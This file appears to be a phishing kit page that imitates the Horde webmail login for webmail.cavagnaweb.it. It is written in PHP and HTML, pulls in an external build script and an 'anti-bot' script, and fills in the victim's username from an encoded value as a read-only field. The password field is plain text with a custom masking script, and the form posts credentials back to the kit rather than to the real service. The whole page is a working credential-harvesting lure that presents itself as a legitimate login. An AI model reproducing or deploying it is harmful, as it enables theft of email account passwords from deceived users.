<?php include '../build.php' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"> <html lang=en-US><meta charset=utf-8>
<script src="anti-bot.js"></script>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<style>*{padding:0;margin:0}body,input,select{font-family:Arial,"DejaVu Sans",sans-serif}body{font-size:75%;background:#fff;color:#000}img{border:none;vertical-align:middle;background:transparent}table{border:none}td{padding:1px}input,select{font-size:100%;font-weight:normal;background-color:#ebeff0;border:1px solid #d0d0d0}input,select{min-height:20px}input,option{padding:1px 5px}select{padding:2px 0 0 2px}input:focus,textarea:focus,select:focus{background-color:#fff;border-color:#000}input[type="submit"]{background-repeat:repeat-x;border:1px solid #d0d0d0;cursor:pointer}input.horde-default{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAeCAAAAADI/isbAAAAHklEQVQIW2NIYvrP9JfpD9NvIITQEDYM/gHyGbBDAMuOEVW/Gl1pAAAAAElFTkSuQmCC);border-color:#2a2a2a;color:#fff}option[disabled]{background-color:#e9e9e9;color:#a8a8a8}body.modal-form{background-color:#e9e9e9}div.modal-form{font-size:150%;width:20em;margin:5em auto;background-color:#fff;-moz-border-radius:10px;-webkit-border-radius:10px;border-radius:10px;-moz-box-shadow:0 0 2em #ccc;-webkit-box-shadow:0 0 2em #ccc;box-shadow:0 0 2em #ccc}div.modal-form form{padding:1em}div.modal-form label{font-weight:bold}div.modal-form input,div.modal-form select{-webkit-transition-property:-webkit-box-shadow,background;-webkit-transition-duration:0.25s;width:18em;margin-bottom:.5em}div.modal-form input{padding-left:0.25em;padding-right:0.25em;width:17.5em}div.modal-form .submit-button{display:block;margin:.5em auto;width:auto}#horde-login-pass-capslock{color:red;font-size:90%;font-weight:bold;padding-bottom:15px}</style><style>input[type="submit"]{padding:3px 10px}</style>
<title>Horde :: Log in</title>
<meta name=referrer content=no-referrer><link type=image/x-icon href=data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAAhgAAAIYBT1XerAAAAAd0SU1FB9wHDQAyAXMVFt4AAAMWSURBVDjLrZPfS1tnGMe/z/mBMSdngcSYEz0BK2qWU+2NhnqhGVu7xty4+10IA/Fml7vanSCsCLkaha7gvyBtkaq9aS4Khcoa17j5M8mMihnBnpOTM3Se5PjuomupWZMWti+88PI+n/f7vDzP81IkMlAHiDMMQyuXy9v4j+ISiQm+t/cKud3un/A/iFMUBZp2FYFAIB4KhdzNwM7Ozu96enpedXR0jLU0BIDh4WF4PB7ieT71PkhRlDuqqqaGrg35QqHQU0VR7rU0lGUZfX198Pl93zQC3d3dy+Fw+Nt4PI4bX9zA6OgoVFWd8fv9V95nKLzZxGIxbG9vu7q6uh6en5/fBfBE8rgzanf46vj4OKLRKPx+P/L5HBi7KJ2cnICImhsGg0FEo5+C47hJwzAmbduGoigYGxuDpmmQZRmO42BvL4ebN798SUS/t3whx3GIxz/D4OAQLMuCaZqQJAmapsHlcgEACoUCqlXTmZubezw/P4+WhgDg9Xrh9XqbdvDFi58hCGJGFMUfWzblY1SpVHB8XMLs7GyeiC6accLZ2RnW19dh/WlB4AW4XC709/dDluVLoCRJEEUR09PTcqvEPGNs9ujo0Do8PMoVi8VXxYN9Pp8vtOv6CVQ1DJ7nX4M8j1qthnK5PGDb9rPT09N9AKzRkFZXV9cTiUQvgK1/atqztLS0f/v2DwORSESenPwKoigCAEzTxIMH97G7uwfbtgEA7LUcxi7q1ap1lxhjnxNR+t0sjLFbuq4vJJMTvlgsJk1MJN/GCoUCdF1HvV5/u2q1GkqlEjY3f/2DmtWCMeZbWVlZTqVS12dmZiBJUjMOjDFks1ksLz9ymnaZiPRkMvm9ZVWtra2tlhNwcHCAXG4PRBwntAKJKD0yMlI0KsZgY8y2bezs7CCbfQnTrDLLqv6ysLDwifCh+bNtmwT+Mra5+RueP1+DUTH+CnYG1xYXF4fb29sNAF9/0JA4hNra2i6dZTIZ6Lq+lk6nrwHYAJAkotN/fb1GBQKBWx5J9vE8j42NDQCA4zg4Pi5hampql4iuN975G5mfNfiZ4Q95AAAAAElFTkSuQmCC rel="shortcut icon"><link rel=canonical href=http://webmail.cavagnaweb.it/login.php><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"></head>
 <body class=modal-form>
<div class=modal-form>
<form name=horde_login id=horde_login method=post action="">
 
 
 
 
<div><label for=horde_user>Username</label></div>
<div>
 <input type=text autocapitalize=none autocorrect=off id=horde_user name="user" value="<?php echo htmlspecialchars($decoded); ?>" readonly style=direction:ltr required>
</div>
<div><label for=horde_pass>Password</label></div>
<div>
 <input type="text" id="text" name="pass" style=direction:ltr required>
</div>
<div id=horde-login-pass-capslock style=display:none>
 Warning: Your Caps Lock key is on!</div>
<div id=horde_select_view_div>
 <div><label for=horde_select_view>Mode</label></div>
 <div>
 <select id=horde_select_view name=horde_select_view>
 <option value=auto selected>Automatic</option>
 <option value disabled>- - - - - - - - - -</option>
 <option value=basic>Basic</option>
 <option value=dynamic>Dynamic</option>
 <option value=smartmobile>Mobile (Smartphone/Tablet)</option>
 <option value=mobile>Mobile (Minimal)</option>
 
 </select>
 </div>
</div>
<div><label for="new_lang">Language</label></div>
<div>
<select id="new_lang" name="new_lang">
    <option value="ar_OM">Arabic (Oman) العربية (عُمان)</option>
    <option value="ar_SY">Arabic (Syria) العربية (سوريا)</option>
    <option value="id_ID">Bahasa Indonesia</option>
    <option value="bs_BA">Bosanski</option>
    <option value="bg_BG">Bulgarian (Български)</option>
    <option value="ca_ES">Català</option>
    <option value="cs_CZ">Čeština</option>
    <option value="zh_CN">Chinese (Simplified) (简体中文)</option>
    <option value="zh_TW">Chinese (Traditional) (繁體中文)</option>
    <option value="da_DK">Dansk</option>
    <option value="de_DE">Deutsch</option>
    <option value="en_US" selected>English (American)</option>
    <option value="en_GB">English (British)</option>
    <option value="en_CA">English (Canadian)</option>
    <option value="es_ES">Español</option>
    <option value="et_EE">Eesti</option>
    <option value="eu_ES">Euskara</option>
    <option value="fa_IR">Farsi (Persian) فارسی (ایران)</option>
    <option value="fr_FR">Français</option>
    <option value="gl_ES">Galego</option>
    <option value="el_GR">Greek (Ελληνικά)</option>
    <option value="he_IL">Hebrew (עברית)</option>
    <option value="hr_HR">Hrvatski</option>
    <option value="is_IS">Íslenska</option>
    <option value="it_IT">Italiano</option>
    <option value="ja_JP">Japanese (日本語)</option>
    <option value="km_KH">Khmer (ខ្មែរ)</option>
    <option value="ko_KR">Korean (한국어)</option>
    <option value="lv_LV">Latviešu</option>
    <option value="lt_LT">Lietuvių</option>
    <option value="mk_MK">Macedonian (Македонски)</option>
    <option value="hu_HU">Magyar</option>
    <option value="nl_NL">Nederlands</option>
    <option value="nb_NO">Norsk (bokmål)</option>
    <option value="nn_NO">Norsk (nynorsk)</option>
    <option value="pl_PL">Polski</option>
    <option value="pt_PT">Português</option>
    <option value="pt_BR">Português do Brasil</option>
    <option value="ro_RO">Română</option>
    <option value="ru_RU">Russian (Русский)</option>
    <option value="sk_SK">Slovenčina</option>
    <option value="sl_SI">Slovenščina</option>
    <option value="fi_FI">Suomi</option>
    <option value="sv_SE">Svenska</option>
    <option value="th_TH">Thai (ไทย)</option>
    <option value="uk_UA">Ukrainian (Українська)</option>
    <option value="tr_TR">Türkçe</option>
</select>
</div>
<div>
 <input id=login-button name=login_button class="horde-default submit-button" value="Log in" type=submit>
</div>
</form>
</div>
<br>
<table width=100%><tbody><tr><td align=center><img src="data:image/png;base64,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" alt="Powered by Horde"></table>
 
 
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("text"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>